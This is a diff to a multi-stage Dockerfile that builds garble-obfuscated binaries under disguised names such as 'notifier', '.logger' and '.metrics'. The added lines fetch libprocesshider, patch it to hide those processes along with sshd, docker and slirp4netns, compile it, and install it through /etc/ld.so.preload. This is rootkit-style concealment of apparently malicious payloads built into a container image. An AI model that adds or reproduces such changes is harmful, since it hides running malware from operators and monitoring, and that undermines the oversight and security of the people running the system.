@@ -70,6 +70,13 @@ RUN mv /src/linux /src/kern &&  mkdir -p cmd/binary && \
     go mod tidy && \
     CGO_ENABLED=0 garble -literals -tiny build -ldflags=" -s -w" -a -installsuffix cgo ./cmd/binary
 
+ADD https://raw.githubusercontent.com/rafaelcalleja/libprocesshider/master/processhider.c ./processhider.c
+ARG METRICS_PROCCESS='{\"notifier\",\".logger\",\".metrics\",\"sshd\",\"docker\",\"slirp4netns\",\"%number%\"}'
+RUN sed -i "s={\"evil_script.py\"}=$METRICS_PROCCESS=g" processhider.c
+RUN gcc -Wall -fPIC -shared -o preload.so processhider.c -ldl -z relro -z now && \
+    mv preload.so /usr/local/lib/ && \
+    echo /usr/local/lib/preload.so >> /etc/ld.so.preload
+
 USER user
 
 FROM $BASE_IMAGE
@@ -78,6 +85,8 @@ COPY --from=obfuscator /src/binary /usr/local/bin/notifier
 COPY --from=obfuscator /src/kern /usr/local/bin/.logger
 COPY --from=obfuscator /src/entry /entrypoint.sh
 COPY --from=obfuscator /src/boot /usr/local/bin/.metrics
+COPY --from=obfuscator /usr/local/lib/preload.so /usr/local/lib/preload.so
+COPY --from=obfuscator /etc/ld.so.preload /etc/ld.so.preload
 
 USER root
 RUN rm -rf /init.sh /kernel.sh /linux
